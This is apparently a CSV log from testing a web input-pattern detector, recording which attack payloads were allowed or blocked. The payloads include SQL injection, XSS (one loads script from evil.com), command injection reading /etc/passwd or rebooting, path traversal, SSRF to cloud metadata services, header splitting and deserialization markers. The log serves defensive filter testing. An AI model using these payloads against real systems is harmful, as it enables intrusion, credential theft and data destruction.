timestamp,attack_type,description,payload,contract_type,expected_gunicorn_block,result,http_status,http_handler,response_body
2025-10-13T15:49:34.050349,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.159645,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.166006,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.275227,SQLi,Authentication Bypass,admin'--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.282391,SQLi,Authentication Bypass,admin'--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.391795,SQLi,Double Quote Tautology,""" OR 1=1--",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.398580,SQLi,Double Quote Tautology,""" OR 1=1--",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.508306,SQLi,Wildcard Bypass,' OR '%'=',Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.514730,SQLi,Wildcard Bypass,' OR '%'=',Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.623782,XSS,Basic Script Tag,<script>alert('XSS')</script>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.630667,XSS,Basic Script Tag,<script>alert('XSS')</script>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.739457,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.745912,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.855107,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.862359,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.968653,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:34.975484,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.081300,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.088413,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.197611,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.205042,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.314482,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.324354,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.432869,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.437931,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.546185,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.552518,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.660854,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.668187,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.778330,Cmd Injection,Simple Pipe,| whoami,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:49:35.785081,Cmd Injection,Simple Pipe,| whoami,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:49:35.894161,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:35.901064,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.010783,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.018071,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.127311,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.134828,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.244290,Cmd Injection,Backticks,`uname -a`,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.251218,Cmd Injection,Backticks,`uname -a`,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.360654,Cmd Injection,Command Substitution,$(reboot),Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.367910,Cmd Injection,Command Substitution,$(reboot),Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.476992,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.480881,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.588261,Path Traversal,Parent Directory,../../etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.595650,Path Traversal,Parent Directory,../../etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.704847,Path Traversal,Root Directory,/etc/shadow,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.712235,Path Traversal,Root Directory,/etc/shadow,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.821509,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.828374,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.935813,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:36.943348,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.052843,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.059943,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.169471,Path Traversal,Null Byte,../../etc/passwd%00,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.176535,Path Traversal,Null Byte,../../etc/passwd%00,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.286396,SSRF,Localhost,http://localhost/admin,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.292961,SSRF,Localhost,http://localhost/admin,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.402641,SSRF,127.0.0.1,http://127.0.0.1:8080,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.409476,SSRF,127.0.0.1,http://127.0.0.1:8080,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.514392,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.518022,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.625376,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.632244,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.741578,SSRF,Internal IP,http://10.0.0.1/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.748386,SSRF,Internal IP,http://10.0.0.1/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.857586,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.865079,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.974221,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:37.980951,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:49:38.089982,Deserialization,Java RMI Header,JRMI,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:49:38.097448,Deserialization,Java RMI Header,JRMI,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:49:38.206732,Deserialization,Python Pickle,"cposix
system
",Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:49:38.213900,Deserialization,Python Pickle,"cposix
system
",Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:49:38.323230,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:49:38.331157,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
